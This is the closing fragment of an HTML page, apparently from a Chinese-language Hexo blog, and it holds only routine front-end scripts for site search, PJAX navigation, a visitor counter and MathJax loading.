        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>